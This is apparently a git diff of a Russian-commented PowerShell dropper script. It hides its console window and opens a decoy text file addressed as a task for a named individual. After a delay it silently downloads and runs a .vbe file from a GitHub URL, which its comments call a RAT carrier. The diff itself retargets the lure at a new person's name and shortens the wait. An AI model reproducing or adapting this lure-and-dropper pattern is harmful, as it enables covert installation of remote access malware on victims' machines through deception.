@@ -9,7 +9,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
 # СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
-$fileName = "Задание_для_Колесникова_А._В.txt"
+$fileName = "Задание_для_Мясникова_Д._А.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
 $content = @"
@@ -68,7 +68,7 @@ $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
 
 # ЗАДЕРЖКА
-Start-Sleep -Seconds 444
+Start-Sleep -Seconds 240
 
 # СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
 $Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
@@ -90,7 +90,4 @@ catch {
 	
 }
 
-
 exit
-
-
